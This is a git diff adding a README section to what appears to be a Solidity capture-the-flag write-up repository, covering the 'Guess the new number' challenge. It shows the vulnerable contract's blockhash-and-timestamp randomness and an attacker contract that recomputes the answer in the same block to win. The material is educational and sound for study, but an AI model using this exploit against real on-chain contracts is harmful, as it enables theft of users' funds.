@@ -12,6 +12,7 @@ Most of the contracts were rewritten slightly so they still compile with newer s
     -   [Guess the number](#guess-the-number)
     -   [Guess the secret number](#guess-the-secret-number)
     -   [Guess the random number](#guess-the-random-number)
+    -   [Guess the new number](#guess-the-new-number)
 
 ## Lotteries
 
@@ -89,3 +90,56 @@ uint8 answer = uint8(uint256(vm.load(address(challenge), 0)));
 ```
 
 [Test](./test/lotteries/TestGuessTheRandomNumberChallenge.t.sol)
+
+### Guess the new number
+
+The answer is a "random" number generated inside the function call:
+
+```solidity
+function guess(uint8 n) public payable {
+        require(msg.value == 1 ether);
+
+        uint8 answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        );
+
+        if (n == answer) {
+            payable(msg.sender).transfer(2 ether);
+        }
+    }
+```
+
+This answer isn't actually random though. The EVM is deterministic, so it is not possible to achieve randomness inside it. Given the same inputs, it will output the same result, and we can exploit this.
+We can create a new contract that calculates the answer and calls the original contract with it. That way we can make sure that the "random" number is generated on the same block, and we can win every time.
+
+```solidity
+        uint8 answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        );
+
+        i_challenge.guess{value: 1 ether}(answer);
+```
+
+This only works if you let the attacker contract receive Ether:
+
+```solidity
+receive() external payable {}
+```
+
+And don't forget to transfer the Ether from the attacker contract to your address (or create a withdraw function only callable by you) 💸
+
+[Test](./test/lotteries/TestGuessTheNewNumberChallenge.t.sol)
